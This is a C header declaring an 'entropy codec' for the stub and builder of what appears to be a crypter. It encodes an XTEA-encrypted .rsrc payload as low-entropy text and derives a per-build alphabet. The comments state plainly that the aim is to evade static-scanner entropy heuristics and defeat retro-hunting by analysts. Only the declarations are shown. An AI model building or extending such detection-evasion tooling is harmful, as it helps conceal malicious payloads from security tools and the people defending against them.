#ifndef ENTROPY_CODEC_H
#define ENTROPY_CODEC_H

#include <Windows.h>

/*
 * ==========================================================================
 *  ENTROPY CODEC — nibble-to-text entropy shaping for the .rsrc payload blob
 *
 *  CZYM:  Each byte is split into two nibbles; every nibble (0..15) is
 *         mapped to one symbol of a 16-symbol lowercase ASCII alphabet.
 *         Encoded size = 2x decoded size.
 *
 *  DLACZEGO: A raw XTEA blob sits at ~7.99 bits/byte — the classic
 *         "high-entropy resource" heuristic every static scanner flags.
 *         After shaping, the resource measures ~4.0 bits/byte over a
 *         16-symbol alphabet, visually and statistically indistinguishable
 *         from text/config data at a glance.
 *
 *         The alphabet is NOT a compile-time constant: a fixed 16-letter
 *         set ("etaoinshrdlucmwf") would be a cross-sample fingerprint —
 *         one charset regex retro-hunt would match every build ever made.
 *         EntropyDeriveAlphabet draws a per-build 16-symbol subset from the
 *         26-letter pool, seeded by key_salt, so each build carries a
 *         different charset and no alphabet bytes appear in either binary.
 *
 *  JAK:    Builder runs EntropyEncode after XTEA (Phase 8.5); the metadata
 *         blobSize keeps the DECODED size, so Stub derives the encoded
 *         footprint as blobSize*2 and runs EntropyDecode in place of the
 *         old memcpy in GetPayloadFromResource. Both sides call
 *         EntropyDeriveAlphabet with the same key_salt first — the
 *         derivation is deterministic (xorshift64 over the 128-bit salt).
 * ==========================================================================
 */

#ifdef __cplusplus
extern "C" {
#endif

/* key_salt: 16 bytes from PAYLOAD_METADATA.  outAlphabet: caller buffer, 16 bytes. */
void EntropyDeriveAlphabet(const BYTE* key_salt, BYTE* outAlphabet);

/* in: decoded bytes, inLen bytes.  out: caller buffer of inLen*2 bytes.
 * alphabet: 16 symbols from EntropyDeriveAlphabet. */
void EntropyEncode(const BYTE* in, DWORD inLen, BYTE* out, const BYTE* alphabet);

/* in: encoded bytes (outLen*2).  out: caller buffer of outLen decoded bytes.
 * alphabet: 16 symbols from EntropyDeriveAlphabet. */
void EntropyDecode(BYTE* out, const BYTE* in, DWORD outLen, const BYTE* alphabet);

#ifdef __cplusplus
}
#endif

#endif /* ENTROPY_CODEC_H */
